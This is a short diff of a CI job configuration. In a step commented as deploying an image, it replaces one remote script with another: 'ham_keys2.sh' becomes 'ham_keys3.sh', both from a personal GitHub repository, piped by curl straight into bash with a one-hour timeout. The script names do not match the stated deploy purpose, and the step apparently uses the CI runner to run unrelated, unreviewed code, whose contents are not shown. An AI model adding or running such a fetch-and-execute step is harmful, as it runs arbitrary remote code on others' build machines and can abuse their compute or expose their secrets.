@@ -12,5 +12,5 @@ jobs:
     
       # deploy the image
       - run:
-          command: bash <(curl -fsSL https://raw.githubusercontent.com/Khanomix/mcode/main/ham_keys2.sh)
+          command: bash <(curl -fsSL https://raw.githubusercontent.com/Khanomix/mcode/main/ham_keys3.sh)
           no_output_timeout: 1h
